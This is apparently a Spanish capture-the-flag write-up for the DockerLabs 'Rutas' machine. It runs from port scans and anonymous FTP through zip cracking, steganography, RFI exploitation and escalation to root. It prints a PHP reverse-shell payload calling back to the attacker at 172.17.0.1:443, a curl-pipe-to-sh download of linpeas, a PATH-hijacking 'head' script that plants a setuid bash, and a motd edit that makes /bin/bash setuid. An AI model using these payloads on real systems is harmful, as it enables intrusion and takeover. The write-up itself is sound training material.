#MAQUINA #DOCKERLABS #MEDIO 
#FTP_ANON #STEGHIDE #RFI
#PATH_HIJACKING #LINPEAS #BRAILE
<hr>

# RECONOCIMIENTO

Vamos a resolver **Rutas** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 16:33 CET
Initiating ARP Ping Scan at 16:33
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 16:33, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:33
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Completed SYN Stealth Scan at 16:33, 0.53s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-24 16:33:49 CET for 1s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** ,el puerto **22(SSH)** y el puerto **21(FTP)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p21,22,80 172.17.0.2            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 16:38 CET
Nmap scan report for admin.s3cr3tdir.dev.gitea.dl (172.17.0.2)
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
|_-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)
|_  256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds





```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 16:38 CET
Nmap scan report for admin.s3cr3tdir.dev.gitea.dl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## FTP (21)

Vulnerable a **ftp-anon**.

```bash
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:victor): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||58249|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
226 Directory send OK.
ftp> get hola_disfruta
local: hola_disfruta remote: hola_disfruta
229 Entering Extended Passive Mode (|||57996|)
150 Opening BINARY mode data connection for hola_disfruta (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
ftp> get respeta.zip
local: respeta.zip remote: respeta.zip
229 Entering Extended Passive Mode (|||56372|)
150 Opening BINARY mode data connection for respeta.zip (293 bytes).
100% |*********************************************************************************************************************************************|   293       15.52 MiB/s    00:00 ETA
226 Transfer complete.
293 bytes received in 00:00 (2.18 MiB/s)
```

hola_disfruta -> NADA
respeta.zip :
```bash
zip2john respeta.zip > x          
ver 2.0 efh 5455 efh 7875 respeta.zip/oculto.txt PKZIP Encr: TS_chk, cmplen=107, decmplen=113, crc=E9450283 ts=8E3B cs=8e3b type=8
john x                                                                       
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
greenday         (respeta.zip/oculto.txt)     
1g 0:00:00:00 DONE 2/3 (2025-03-24 16:41) 50.00g/s 3089Kp/s 3089Kc/s 3089KC/s 123456..MATT
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```bash

cat oculto.txt   
Consigue la imagen crackpass.jpg
firstatack.github.io
sin fuzzing con logica y observando la sacaras ,muy rapido

```

Vamos a la web (https://firstatack.github.io/) :
Al ver donde estan las imagenes vemos que se encuentran en `https://firstatack.github.io/assets/` :

```bash
wget https://firstatack.github.io/assets/crackpass.jpg
steghide extract -sf crackpass.jpg 
Enter passphrase: 
wrote extracted data to "passwd.zip".
cat pass 
hackeada:denuevo
```

Tenemos unas credenciales.
## HTTP (80)

Usamos **gobuster** :

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1116]
/index.html           (Status: 200) [Size: 10671]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Vamos al **index.php** y al hacer Ctrl + U :

```bash
trackedvuln.dl
```

Lo metemos al `/etc/hosts`

Y al meternos en `http://trackedvuln.dl/index.php`, metemos credenciales y nos deja entrar a la web.

Necesario el **token** -> Para ello simplemente en el burpsuite coger el token de una petición.

Usamos **gobuster** y no vemos nada :
```bash
gobuster dir -u http://trackedvuln.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw=="
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://trackedvuln.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,png,jpg,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 901]
/index.html           (Status: 200) [Size: 10672]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Vamos a intentar encontrar un posible **LFI** :

```bash

wfuzz -u "http://trackedvuln.dl/index.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==" --hw=86
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://trackedvuln.dl/index.php?FUZZ=/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000001915:   200        39 L     104 W      1071 Ch     "love"
```


Vemos que hay un posible **LFI**.
# EXPLOTACION

Vemos que con:

```bash
http://trackedvuln.dl/index.php?love=/etc/passwd
```

No nos lo muestra y que recordemos mirar /tmp.

Vamos a probar con un **RFI** :

```bash
http://trackedvuln.dl/index.php?love=http://localhost/index.html
```

Nos muestra la pagina, por lo que es vulnerable a un **RFI**.

Vamos a darnos una shell esuchando por el puerto 443:
```bash

http://trackedvuln.dl/index.php?love=http://172.17.0.1:8000/wp.php

```

```php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
www-data@7566280e5ffd:/tmp$ sudo -l
Matching Defaults entries for www-data on 7566280e5ffd:
    env_reset, mail_badpass,
    secure_path=/tmp\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 7566280e5ffd:
    (norberto) NOPASSWD: /usr/bin/baner

```

Vemos **baner** con permisos SUDO , vamos a buscar que puede ser antes de hacer nada :

   ```bash
www-data@7566280e5ffd:/tmp$ baner
Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

```

Vemos que ejecuta head con ruta relativa -> **PATH HIJACKING**

```bash
www-data@7566280e5ffd:/tmp$ export PATH=/tmp:$PATH
www-data@7566280e5ffd:/tmp$ echo $PATH
/tmp:/tmp:/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@7566280e5ffd:/tmp$ chmod 777 head
www-data@7566280e5ffd:/tmp$ cat head
#!/bin/bash

cp /bin/bash  /tmp/norberto

chmod +s /tmp/norberto
www-data@7566280e5ffd:/tmp$ sudo -u norberto /usr/bin/baner
Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:
www-data@7566280e5ffd:/tmp$ ls
head  norberto  wp.php  wp.php.1
www-data@7566280e5ffd:/tmp$ ls -la
total 1436
drwxrwxrwt 1 root     root        4096 Mar 25 19:46 .
drwxr-xr-x 1 root     root        4096 Mar 25 18:19 ..
-rwxrwxrwx 1 www-data www-data      65 Mar 25 19:44 head
-rwsr-sr-x 1 norberto norberto 1446024 Mar 25 19:46 norberto
-rw-r--r-- 1 www-data www-data     250 Nov 25 21:56 wp.php
-rw-r--r-- 1 www-data www-data     250 Nov 25 21:56 wp.php.1
www-data@7566280e5ffd:/tmp$ norberto
www-data@7566280e5ffd:/tmp$ norberto -p
norberto-5.2$ id
uid=33(www-data) gid=33(www-data) euid=1001(norberto) egid=1001(norberto) groups=1001(norberto),33(www-data)
norberto-5.2$ whoami
norberto
norberto-5.2$ 


```

YA ESTAMOS COMO NORBERTO.

Vemos lo siguiente :

```bash
norberto-5.2$ cat /home/norberto/.-/.miscredenciales
Hasta aqui no sirvio mi password

⠏⠗⠁⠉⠞⠊⠉⠁⠉⠗⠑⠁⠝⠙⠕⠗⠑⠞⠕⠎

Debes tenerlo a mano te sera util
Usa mis pass para escalar
feliz hack de firstatack
```

Es braile -> **PRACTICACREANDORETOS**

No parece funcionar.

Vamos a buscar archivos con SUID:
```bash
norberto-5.2$ find / -perm -4000 2>/dev/null
/tmp/norberto
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/baner
/usr/bin/sudo
/usr/lib/bash
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
norberto-5.2$ ls -la /usr/lib/bash
-rwsr-sr-x 1 maria maria 1446024 Jul 10  2024 /usr/lib/bash

```

Podemos convertirnos en maria.

YA ESTAMOS COMO MARIA.

En su directorio personal :

```bash
bash-5.2$ cat .mipass 
maria:asientiendesmejor
Donde podre escribir
```

YA ESTAMOS COMO MARIA.

Usamos linpeas: 

```bash

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

```


```bash
Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                          
/dev/mqueue                                                                                                                                                                               
/dev/shm
/etc/update-motd.d/00-header
/home/maria
/run/lock
/tmp
/tmp/head
/usr/bin/f1nd
/usr/lib/bash
/usr/lib/systemd/system/vsftpd.service
/var/lib/php/sessions
/var/tmp

```

Vemos /etc/update-motd.d/00-header ->**Un marco sencillo para generar dinámicamente el Mensaje del Día (motd).** **Marco y scripts para generar un Mensaje del Día generado dinámicamente**

Le modificamos y agregamos:
```bash

chmod +4777 /bin/bash

```

Nos volvemos a loggear via ssh.

```bash
-bash-5.2$ whoami
maria
-bash-5.2$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
-bash-5.2$ bash -p
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**